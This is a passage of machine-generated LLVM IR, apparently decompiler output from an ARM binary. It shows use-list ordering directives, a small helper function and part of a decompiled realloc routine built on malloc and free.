  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 50, 43, 44, 45, 46, 47, 48, 49, 51, 52, 53, 54, 55, 56, 57 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 47, 42, 43, 44, 45, 46, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 30, 3, 5, 6, 7, 19, 11, 8, 20, 9, 10, 13, 12, 17, 14, 21, 16, 15, 22, 18, 26, 24, 23, 25, 28, 27, 31, 29, 36, 32, 33, 1, 34, 35, 37, 38, 39, 42, 43, 40, 41, 48, 45, 44, 46, 47, 49, 54, 50, 51, 52, 53, 56, 55, 59, 58, 57, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 10, 13, 11, 14, 15, 16, 17, 18, 19, 20, 21, 22, 1, 23, 24, 36, 35, 28, 25, 0, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_167c0, { 1, 0 }
  uselistorder label %dec_label_pc_167a4, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_167a0, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_16790, { 1, 2, 0 }
  uselistorder label %bb168, { 1, 0 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %dec_label_pc_16724, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_166a0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_16698, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %.thread44, { 1, 0 }
  uselistorder label %.thread43, { 1, 0 }
  uselistorder label %.thread40, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1656c, { 1, 0 }
  uselistorder label %.thread32, { 1, 0 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %dec_label_pc_164a0, { 2, 0, 3, 1 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %.thread27, { 1, 0 }
  uselistorder label %dec_label_pc_16358, { 0, 2, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_162ac, { 1, 0 }
  uselistorder label %dec_label_pc_162b4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_16278, { 1, 0 }
  uselistorder label %dec_label_pc_1622c, { 1, 0 }
  uselistorder label %dec_label_pc_161c0, { 1, 0 }
  uselistorder label %dec_label_pc_161bc, { 1, 0 }
  uselistorder label %dec_label_pc_16168, { 1, 0 }
  uselistorder label %dec_label_pc_16154, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1611c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_16108, { 1, 0 }
  uselistorder label %bb140, { 1, 0 }
  uselistorder label %bb138, { 1, 0 }
}

define i32 @function_167d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_167d4:
  %v0_167d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_167d4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_167d4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_167d4, %bb
  %v10_167e8 = phi i32 [ %arg1, %dec_label_pc_167d4 ], [ 0, %bb ]
  ret i32 %v10_167e8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_167ec = load i32, i32* @r4, align 4
  %v6_167ec = load i32, i32* @r5, align 4
  %v9_167ec = load i32, i32* @r6, align 4
  %v12_167ec = load i32, i32* @r7, align 4
  %v15_167ec = load i32, i32* @r8, align 4
  %v18_167ec = load i32, i32* @sb, align 4
  %v21_167ec = load i32, i32* @sl, align 4
  %v24_167ec = load i32, i32* @fp, align 4
  %v27_167ec = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_167f8 = icmp eq i32* %arg1, null
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_167f8, label %dec_label_pc_1680c, label %dec_label_pc_1681c

dec_label_pc_1680c:                               ; preds = %entry
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v1_16810 = call i32 @malloc(i32 %arg2)
  store i32 %v1_16810, i32* %r0.global-to-local, align 4
  store i32 %v1_16810, i32* @r4, align 4
  br label %dec_label_pc_16b74

dec_label_pc_1681c:                               ; preds = %entry
  %v2_1681c = icmp eq i32 %arg2, 0
  br i1 %v2_1681c, label %dec_label_pc_16824, label %dec_label_pc_16830

dec_label_pc_16824:                               ; preds = %dec_label_pc_1681c
  %v0_16824 = call i32 @free()
  store i32 %v0_16824, i32* %r0.global-to-local, align 4
  %v0_16828 = load i32, i32* @r6, align 4
  store i32 %v0_16828, i32* @r4, align 4
  br label %dec_label_pc_16b74

dec_label_pc_16830:                               ; preds = %dec_label_pc_1681c
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_16838 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 72) to i32*), align 4
  store i32 %v4_16838, i32* @r4, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  store i32 %v4_16838, i32* %r2.global-to-local, align 4
  %v4_16844 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 36) to i32*), align 4
  store i32 %v4_16844, i32* %r1.global-to-local, align 4
  %v2_16848 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16848, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_16850 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_16850)
  %v0_1685c = load i32, i32* @r4, align 4
  store i32 %v0_1685c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_16868 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 16) to i32*), align 4
  store i32 %v4_16868, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_16874.985 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_16868)
  %v0_16874 = load i32, i32* @r6, align 4
  %tmp36 = icmp ult i32 %v0_16874, -32
  br i1 %tmp36, label %dec_label_pc_16890, label %dec_label_pc_1687c

dec_label_pc_1687c:                               ; preds = %dec_label_pc_16830
  %v0_1687c = call i32 @__GI___errno_location()
  store i32 %v0_1687c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16888 = inttoptr i32 %v0_1687c to i32*
  store i32 12, i32* %v2_16888, align 4
  br label %dec_label_pc_16b74

dec_label_pc_16890:                               ; preds = %dec_label_pc_16830
  %v1_16890 = add i32 %v0_16874, 11
  store i32 %v1_16890, i32* %r0.global-to-local, align 4
  %v0_16894 = load i32, i32* @r5, align 4
  %v1_16894 = add i32 %v0_16894, -4
  %v2_16894 = inttoptr i32 %v1_16894 to i32*
  %v3_16894 = load i32, i32* %v2_16894, align 4
  store i32 %v3_16894, i32* %r2.global-to-local, align 4
  %v2_16898 = icmp ugt i32 %v1_16890, 14
  %v7_16898 = icmp eq i32 %v1_16890, 15
  %v2_1689c = xor i1 %v2_16898, true
  %v3_1689c = or i1 %v7_16898, %v2_1689c
  br i1 %v3_1689c, label %bb, label %bb27

bb:                                               ; preds = %dec_label_pc_16890
  store i32 16, i32* @sb, align 4
  br label %bb27

bb27:                                             ; preds = %dec_label_pc_16890, %bb
  %v2_168a0 = xor i1 %v7_16898, true
  %v3_168a0 = and i1 %v2_16898, %v2_168a0
  br i1 %v3_168a0, label %bb28, label %bb29

bb28:                                             ; preds = %bb27
  %v5_168a0 = and i32 %v1_16890, -8
  store i32 %v5_168a0, i32* @sb, align 4
  br label %bb29

bb29:                                             ; preds = %bb27, %bb28
  %v1_168a4 = and i32 %v3_16894, 2
  %v2_168a4 = icmp eq i32 %v1_168a4, 0
  %v1_168a8 = add i32 %v0_16894, -8
  store i32 %v1_168a8, i32* @sl, align 4
  %v1_168ac = and i32 %v3_16894, -4
  store i32 %v1_168ac, i32* @r6, align 4
  br i1 %v2_168a4, label %dec_label_pc_168b4, label %dec_label_pc_16a8c

dec_label_pc_168b4:                               ; preds = %bb29
  %v1_168b4 = load i32, i32* @sb, align 4
  %v3_168b4 = icmp ult i32 %v1_168ac, %v1_168b4
  br i1 %v3_168b4, label %dec_label_pc_168c0, label %bb30

bb30:                                             ; preds = %dec_label_pc_168b4
  store i32 %v1_168ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a24

dec_label_pc_168c0:                               ; preds = %dec_label_pc_168b4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_168c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_168c8, i32* %r0.global-to-local, align 4
  %v1_168cc = add i32 %v4_168c8, 44
  %v2_168cc = inttoptr i32 %v1_168cc to i32*
  %v3_168cc = load i32, i32* %v2_168cc, align 4
  store i32 %v3_168cc, i32* %r3.global-to-local, align 4
  %v2_168d0 = add i32 %v1_168ac, %v1_168a8
  store i32 %v2_168d0, i32* @r4, align 4
  %v9_168d4 = icmp eq i32 %v2_168d0, %v3_168cc
  %v1_168d8 = add i32 %v2_168d0, 4
  %v2_168d8 = inttoptr i32 %v1_168d8 to i32*
  %v3_168d8 = load i32, i32* %v2_168d8, align 4
  store i32 %v3_168d8, i32* %r1.global-to-local, align 4
  br i1 %v9_168d4, label %dec_label_pc_168e0, label %dec_label_pc_1691c

dec_label_pc_168e0:                               ; preds = %dec_label_pc_168c0
  %v1_168e0 = and i32 %v3_168d8, -4
  %v2_168e4 = add i32 %v1_168e0, %v1_168ac
  store i32 %v2_168e4, i32* %r1.global-to-local, align 4
  %v1_168e8 = add i32 %v1_168b4, 16
  store i32 %v1_168e8, i32* %r3.global-to-local, align 4
  %v3_168ec = icmp ult i32 %v2_168e4, %v1_168e8
  br i1 %v3_168ec, label %dec_label_pc_16970, label %dec_label_pc_168f4

dec_label_pc_168f4:                               ; preds = %dec_label_pc_168e0
  %v2_168f4 = sub i32 %v2_168e4, %v1_168b4
  %v1_168f8 = urem i32 %v3_16894, 2
  %v2_168fc = add i32 %v1_168b4, %v1_168a8
  store i32 %v2_168fc, i32* %r1.global-to-local, align 4
  %v2_16900 = or i32 %v1_168b4, %v1_168f8
  store i32 %v2_16900, i32* %r2.global-to-local, align 4
  %v1_16904 = or i32 %v2_168f4, 1
  store i32 %v1_16904, i32* %r3.global-to-local, align 4
  store i32 %v0_16894, i32* @r4, align 4
  store i32 %v2_16900, i32* %v2_16894, align 4
  %v0_16910 = load i32, i32* %r1.global-to-local, align 4
  %v1_16910 = load i32, i32* %r0.global-to-local, align 4
  %v2_16910 = add i32 %v1_16910, 44
  %v3_16910 = inttoptr i32 %v2_16910 to i32*
  store i32 %v0_16910, i32* %v3_16910, align 4
  %v0_16914 = load i32, i32* %r3.global-to-local, align 4
  %v1_16914 = load i32, i32* %r1.global-to-local, align 4
  %v2_16914 = add i32 %v1_16914, 4
  %v3_16914 = inttoptr i32 %v2_16914 to i32*
  store i32 %v0_16914, i32* %v3_16914, align 4
  br label %dec_label_pc_16b58

dec_label_pc_1691c:                               ; preds = %dec_label_pc_168c0
  %v1_1691c = and i32 %v3_168d8, -2
  %v2_16920 = add i32 %v1_1691c, %v2_168d0
  store i32 %v2_16920, i32* %r3.global-to-local, align 4
  %v1_16924 = add i32 %v2_16920, 4
  %v2_16924 = inttoptr i32 %v1_16924 to i32*
  %v3_16924 = load i32, i32* %v2_16924, align 4
  store i32 %v3_16924, i32* %r3.global-to-local, align 4
  %v1_16928 = urem i32 %v3_16924, 2
  %v2_16928 = icmp eq i32 %v1_16928, 0
  br i1 %v2_16928, label %dec_label_pc_16930, label %dec_label_pc_16970

dec_label_pc_16930:                               ; preds = %dec_label_pc_1691c
  %v1_16930 = and i32 %v3_168d8, -4
  store i32 %v1_16930, i32* %r3.global-to-local, align 4
  %v2_16934 = add i32 %v1_16930, %v1_168ac
  store i32 %v2_16934, i32* %r0.global-to-local, align 4
  %v3_16938 = icmp ult i32 %v2_16934, %v1_168b4
  br i1 %v3_16938, label %dec_label_pc_16970, label %dec_label_pc_16940

dec_label_pc_16940:                               ; preds = %dec_label_pc_16930
  %v1_16940 = add i32 %v1_168ac, %v0_16894
  %v2_16940 = inttoptr i32 %v1_16940 to i32*
  %v3_16940 = load i32, i32* %v2_16940, align 4
  store i32 %v3_16940, i32* %r1.global-to-local, align 4
  %v1_16944 = add i32 %v3_16940, 12
  %v2_16944 = inttoptr i32 %v1_16944 to i32*
  %v3_16944 = load i32, i32* %v2_16944, align 4
  store i32 %v3_16944, i32* %r3.global-to-local, align 4
  %v9_16948 = icmp eq i32 %v3_16944, %v2_168d0
  %v1_1694c = add i32 %v2_168d0, 12
  %v2_1694c = inttoptr i32 %v1_1694c to i32*
  %v3_1694c = load i32, i32* %v2_1694c, align 4
  store i32 %v3_1694c, i32* %r2.global-to-local, align 4
  br i1 %v9_16948, label %dec_label_pc_16954, label %dec_label_pc_16960

dec_label_pc_16954:                               ; preds = %dec_label_pc_16940
  %v1_16954 = add i32 %v3_1694c, 8
  %v2_16954 = inttoptr i32 %v1_16954 to i32*
  %v3_16954 = load i32, i32* %v2_16954, align 4
  store i32 %v3_16954, i32* %r3.global-to-local, align 4
  %v9_16958 = icmp eq i32 %v3_16954, %v2_168d0
  br i1 %v9_16958, label %dec_label_pc_16964, label %dec_label_pc_16960

dec_label_pc_16960:                               ; preds = %dec_label_pc_16940, %dec_label_pc_16954
  %v0_16960 = call i32 @abort()
  store i32 %v0_16960, i32* %r0.global-to-local, align 4
  %v0_16964.pre = load i32, i32* @r1, align 4
  %v1_16964.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_16964

dec_label_pc_16964:                               ; preds = %dec_label_pc_16954, %dec_label_pc_16960
  %v1_16964 = phi i32 [ %v3_1694c, %dec_label_pc_16954 ], [ %v1_16964.pre, %dec_label_pc_16960 ]
  %v0_16964 = phi i32 [ %v3_16940, %dec_label_pc_16954 ], [ %v0_16964.pre, %dec_label_pc_16960 ]
  %v2_16964 = add i32 %v1_16964, 8
  %v3_16964 = inttoptr i32 %v2_16964 to i32*
  store i32 %v0_16964, i32* %v3_16964, align 4
  %v0_16968 = load i32, i32* %r2.global-to-local, align 4
  %v1_16968 = load i32, i32* %r1.global-to-local, align 4
  %v2_16968 = add i32 %v1_16968, 12
  %v3_16968 = inttoptr i32 %v2_16968 to i32*
  store i32 %v0_16968, i32* %v3_16968, align 4
  %v1_16a24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a24

dec_label_pc_16970:                               ; preds = %dec_label_pc_168e0, %dec_label_pc_16930, %dec_label_pc_1691c
  %v1_16970 = add i32 %v1_168b4, -7
  store i32 %v1_16970, i32* %r0.global-to-local, align 4
  %v1_16974 = call i32 @malloc(i32 %v1_16970)
  store i32 %v1_16974, i32* @r0, align 4
  store i32 %v1_16974, i32* %r1.global-to-local, align 4
  %v2_16978 = icmp eq i32 %v1_16974, 0
  br i1 %v2_16978, label %bb31, label %dec_label_pc_16984

bb31:                                             ; preds = %dec_label_pc_16970
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16984:                               ; preds = %dec_label_pc_16970
  %v1_1698c.pre = load i32, i32* @r4, align 4
  %v1_16984 = add i32 %v1_16974, -4
  %v2_16984 = inttoptr i32 %v1_16984 to i32*
  %v3_16984 = load i32, i32* %v2_16984, align 4
  store i32 %v3_16984, i32* @r3, align 4
  %v1_16988 = add i32 %v1_16974, -8
  store i32 %v1_16988, i32* @r7, align 4
  %v9_1698c = icmp eq i32 %v1_16988, %v1_1698c.pre
  br i1 %v9_1698c, label %.thread2, label %dec_label_pc_1699c

.thread2:                                         ; preds = %dec_label_pc_16984
  %v2_16990 = and i32 %v3_16984, -4
  store i32 %v2_16990, i32* %r3.global-to-local, align 4
  %v2_16994 = load i32, i32* @r6, align 4
  %v3_16994 = add i32 %v2_16994, %v2_16990
  store i32 %v3_16994, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a24

dec_label_pc_1699c:                               ; preds = %dec_label_pc_16984
  %v0_1699c = load i32, i32* @r6, align 4
  %v1_1699c = add i32 %v0_1699c, -4
  store i32 %v1_1699c, i32* @r2, align 4
  %v3_169a0 = udiv i32 %v1_1699c, 4
  store i32 %v3_169a0, i32* @ip, align 4
  %tmp37 = and i32 %v1_1699c, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_169a8 = icmp ult i32 %v1_1699c, 36
  %v3_169a8 = or i1 %tmp38, %v2_169a8
  %v0_169b8 = load i32, i32* @r5, align 4
  br i1 %v3_169a8, label %dec_label_pc_169b8, label %dec_label_pc_169ac

dec_label_pc_169ac:                               ; preds = %dec_label_pc_1699c
  store i32 %v0_169b8, i32* @r1, align 4
  %v0_169b0 = call i32 @memcpy()
  store i32 %v0_169b0, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_169b8:                               ; preds = %dec_label_pc_1699c
  %v1_169b8 = inttoptr i32 %v0_169b8 to i32*
  %v2_169b8 = load i32, i32* %v1_169b8, align 4
  store i32 %v2_169b8, i32* %r3.global-to-local, align 4
  %v2_169bc = inttoptr i32 %v1_16974 to i32*
  store i32 %v2_169b8, i32* %v2_169bc, align 4
  %v0_169c0 = load i32, i32* @r5, align 4
  %v1_169c0 = add i32 %v0_169c0, 4
  %v2_169c0 = inttoptr i32 %v1_169c0 to i32*
  %v3_169c0 = load i32, i32* %v2_169c0, align 4
  store i32 %v3_169c0, i32* %r3.global-to-local, align 4
  %v1_169c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_169c4 = add i32 %v1_169c4, 4
  %v3_169c4 = inttoptr i32 %v2_169c4 to i32*
  store i32 %v3_169c0, i32* %v3_169c4, align 4
  %v0_169c8 = load i32, i32* @r5, align 4
  %v1_169c8 = add i32 %v0_169c8, 8
  %v2_169c8 = inttoptr i32 %v1_169c8 to i32*
  %v3_169c8 = load i32, i32* %v2_169c8, align 4
  store i32 %v3_169c8, i32* %r3.global-to-local, align 4
  %v0_169cc = load i32, i32* @ip, align 4
  %v1_169d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_169d0 = add i32 %v1_169d0, 8
  %v3_169d0 = inttoptr i32 %v2_169d0 to i32*
  store i32 %v3_169c8, i32* %v3_169d0, align 4
  %tmp39 = icmp ult i32 %v0_169cc, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_169d8

dec_label_pc_169d8:                               ; preds = %dec_label_pc_169b8
  %v0_169d8 = load i32, i32* @r5, align 4
  %v1_169d8 = add i32 %v0_169d8, 12
  %v2_169d8 = inttoptr i32 %v1_169d8 to i32*
  %v3_169d8 = load i32, i32* %v2_169d8, align 4
  store i32 %v3_169d8, i32* %r3.global-to-local, align 4
  %v1_169dc = load i32, i32* %r1.global-to-local, align 4
  %v2_169dc = add i32 %v1_169dc, 12
  %v3_169dc = inttoptr i32 %v2_169dc to i32*
  store i32 %v3_169d8, i32* %v3_169dc, align 4
  %v0_169e0 = load i32, i32* @r5, align 4
  %v1_169e0 = add i32 %v0_169e0, 16
  %v2_169e0 = inttoptr i32 %v1_169e0 to i32*
  %v3_169e0 = load i32, i32* %v2_169e0, align 4
  store i32 %v3_169e0, i32* %r3.global-to-local, align 4
  %v0_169e4 = load i32, i32* @ip, align 4
  %v1_169e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_169e8 = add i32 %v1_169e8, 16
  %v3_169e8 = inttoptr i32 %v2_169e8 to i32*
  store i32 %v3_169e0, i32* %v3_169e8, align 4
  %tmp40 = icmp ult i32 %v0_169e4, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_169f0

dec_label_pc_169f0:                               ; preds = %dec_label_pc_169d8
  %v0_169f0 = load i32, i32* @r5, align 4
  %v1_169f0 = add i32 %v0_169f0, 20
  %v2_169f0 = inttoptr i32 %v1_169f0 to i32*
  %v3_169f0 = load i32, i32* %v2_169f0, align 4
  store i32 %v3_169f0, i32* %r3.global-to-local, align 4
  %v1_169f4 = load i32, i32* %r1.global-to-local, align 4
  %v2_169f4 = add i32 %v1_169f4, 20
  %v3_169f4 = inttoptr i32 %v2_169f4 to i32*
  store i32 %v3_169f0, i32* %v3_169f4, align 4
  %v0_169f8 = load i32, i32* @r5, align 4
  %v1_169f8 = add i32 %v0_169f8, 24
  %v2_169f8 = inttoptr i32 %v1_169f8 to i32*
  %v3_169f8 = load i32, i32* %v2_169f8, align 4
  store i32 %v3_169f8, i32* %r3.global-to-local, align 4
  %v1_169fc = load i32, i32* %r1.global-to-local, align 4
  %v2_169fc = add i32 %v1_169fc, 24
  %v3_169fc = inttoptr i32 %v2_169fc to i32*
  store i32 %v3_169f8, i32* %v3_169fc, align 4
  %v0_16a00 = load i32, i32* @ip, align 4
  %v7_16a00 = icmp eq i32 %v0_16a00, 9
  br i1 %v7_16a00, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_169f0
  %v1_16a04 = load i32, i32* @r5, align 4
  %v2_16a04 = add i32 %v1_16a04, 28
  %v3_16a04 = inttoptr i32 %v2_16a04 to i32*
  %v4_16a04 = load i32, i32* %v3_16a04, align 4
  store i32 %v4_16a04, i32* %r3.global-to-local, align 4
  %v2_16a08 = load i32, i32* %r1.global-to-local, align 4
  %v3_16a08 = add i32 %v2_16a08, 28
  %v4_16a08 = inttoptr i32 %v3_16a08 to i32*
  store i32 %v4_16a04, i32* %v4_16a08, align 4
  %v1_16a0c = load i32, i32* @r5, align 4
  %v2_16a0c = add i32 %v1_16a0c, 32
  %v3_16a0c = inttoptr i32 %v2_16a0c to i32*
  %v4_16a0c = load i32, i32* %v3_16a0c, align 4
  store i32 %v4_16a0c, i32* %r3.global-to-local, align 4
  %v2_16a10 = load i32, i32* %r1.global-to-local, align 4
  %v3_16a10 = add i32 %v2_16a10, 32
  %v4_16a10 = inttoptr i32 %v3_16a10 to i32*
  store i32 %v4_16a0c, i32* %v4_16a10, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_169f0, %dec_label_pc_169d8, %dec_label_pc_169b8, %dec_label_pc_169ac, %bb32
  %v0_16a14 = load i32, i32* @r5, align 4
  store i32 %v0_16a14, i32* @r0, align 4
  %v0_16a18 = call i32 @free()
  store i32 %v0_16a18, i32* %r0.global-to-local, align 4
  %v0_16a1c = load i32, i32* @r7, align 4
  %v1_16a1c = add i32 %v0_16a1c, 8
  store i32 %v1_16a1c, i32* @r4, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16a24:                               ; preds = %bb30, %.thread2, %dec_label_pc_16964
  %v0_16a38 = phi i32 [ %v3_16994, %.thread2 ], [ %v1_168ac, %bb30 ], [ %v1_16a24.pre, %dec_label_pc_16964 ]
  %v0_16a24 = load i32, i32* @sb, align 4
  %v2_16a24 = sub i32 %v0_16a38, %v0_16a24
  store i32 %v2_16a24, i32* %r1.global-to-local, align 4
  %v0_16a2c = load i32, i32* @sl, align 4
  %v1_16a2c = add i32 %v0_16a2c, 4
  %v2_16a2c = inttoptr i32 %v1_16a2c to i32*
  %v3_16a2c = load i32, i32* %v2_16a2c, align 4
  %tmp41 = icmp ugt i32 %v2_16a24, 15
  %v1_16a54 = urem i32 %v3_16a2c, 2
  store i32 %v1_16a54, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_16a54, label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_16a24
  %v2_16a38 = or i32 %v1_16a54, %v0_16a38
  store i32 %v2_16a38, i32* %r3.global-to-local, align 4
  store i32 %v2_16a38, i32* %v2_16a2c, align 4
  %v0_16a40 = load i32, i32* @sl, align 4
  %v1_16a40 = load i32, i32* %r0.global-to-local, align 4
  %v2_16a40 = add i32 %v1_16a40, %v0_16a40
  store i32 %v2_16a40, i32* %r2.global-to-local, align 4
  %v1_16a44 = add i32 %v2_16a40, 4
  %v2_16a44 = inttoptr i32 %v1_16a44 to i32*
  %v3_16a44 = load i32, i32* %v2_16a44, align 4
  %v1_16a48 = or i32 %v3_16a44, 1
  store i32 %v1_16a48, i32* %r3.global-to-local, align 4
  store i32 %v1_16a48, i32* %v2_16a44, align 4
  br label %dec_label_pc_16a84

dec_label_pc_16a54:                               ; preds = %dec_label_pc_16a24
  %v2_16a58 = add i32 %v0_16a2c, %v0_16a24
  store i32 %v2_16a58, i32* %r0.global-to-local, align 4
  %v2_16a5c = or i32 %v1_16a54, %v0_16a24
  store i32 %v2_16a5c, i32* %r3.global-to-local, align 4
  %v1_16a60 = or i32 %v2_16a24, 1
  store i32 %v1_16a60, i32* %r2.global-to-local, align 4
  store i32 %v2_16a5c, i32* %v2_16a2c, align 4
  %v0_16a68 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a68 = load i32, i32* %r0.global-to-local, align 4
  %v2_16a68 = add i32 %v1_16a68, 4
  %v3_16a68 = inttoptr i32 %v2_16a68 to i32*
  store i32 %v0_16a68, i32* %v3_16a68, align 4
  %v0_16a6c = load i32, i32* %r0.global-to-local, align 4
  %v1_16a6c = load i32, i32* %r1.global-to-local, align 4
  %v2_16a6c = add i32 %v1_16a6c, %v0_16a6c
  store i32 %v2_16a6c, i32* %r2.global-to-local, align 4
  %v1_16a70 = add i32 %v2_16a6c, 4
  %v2_16a70 = inttoptr i32 %v1_16a70 to i32*
  %v3_16a70 = load i32, i32* %v2_16a70, align 4
  %v1_16a74 = or i32 %v3_16a70, 1
  store i32 %v1_16a74, i32* %r3.global-to-local, align 4
  store i32 %v1_16a74, i32* %v2_16a70, align 4
  %v0_16a7c = load i32, i32* %r0.global-to-local, align 4
  %v1_16a7c = add i32 %v0_16a7c, 8
  store i32 %v1_16a7c, i32* @r0, align 4
  %v0_16a80 = call i32 @free()
  store i32 %v0_16a80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16a84

dec_label_pc_16a84:                               ; preds = %dec_label_pc_16a34, %dec_label_pc_16a54
  %v0_16a84 = load i32, i32* @sl, align 4
  %v1_16a84 = add i32 %v0_16a84, 8
  store i32 %v1_16a84, i32* @r4, align 4
  br label %dec_label_pc_16b58

dec_label_pc_16a8c:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  %v4_16a94 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16a94, i32* @r8, align 4
  %v2_16a98 = inttoptr i32 %v1_168a8 to i32*
  %v3_16a98 = load i32, i32* %v2_16a98, align 4
  store i32 %v3_16a98, i32* @r4, align 4
  %v1_16a9c = add i32 %v4_16a94, 860
  %v2_16a9c = inttoptr i32 %v1_16a9c to i32*
  %v3_16a9c = load i32, i32* %v2_16a9c, align 4
  %v1_16aa0 = add i32 %v3_16a98, 4
  %v1_16aa4 = add i32 %v3_16a9c, -1
  store i32 %v1_16aa4, i32* %r2.global-to-local, align 4
  %v2_16aa8 = add i32 %v1_16aa0, %v1_16aa4
  %v1_16aac = load i32, i32* @sb, align 4
  %v2_16aac = add i32 %v2_16aa8, %v1_16aac
  store i32 %v2_16aac, i32* %r3.global-to-local, align 4
  %v2_16ab0 = sub i32 0, %v3_16a9c
  %v3_16ab0 = and i32 %v2_16aac, %v2_16ab0
  store i32 %v3_16ab0, i32* @r7, align 4
  %v2_16ab4 = sub i32 %v3_16ab0, %v3_16a98
  store i32 %v2_16ab4, i32* @fp, align 4
  %v9_16ab8 = icmp eq i32 %v1_168ac, %v2_16ab4
  br i1 %v9_16ab8, label %dec_label_pc_16b2c, label %dec_label_pc_16ac0

dec_label_pc_16ac0:                               ; preds = %dec_label_pc_16a8c
  %v2_16ac0 = sub i32 %v1_168a8, %v3_16a98
  store i32 %v2_16ac0, i32* %r0.global-to-local, align 4
  %v2_16ac4 = add i32 %v3_16a98, %v1_168ac
  store i32 %v2_16ac4, i32* %r1.global-to-local, align 4
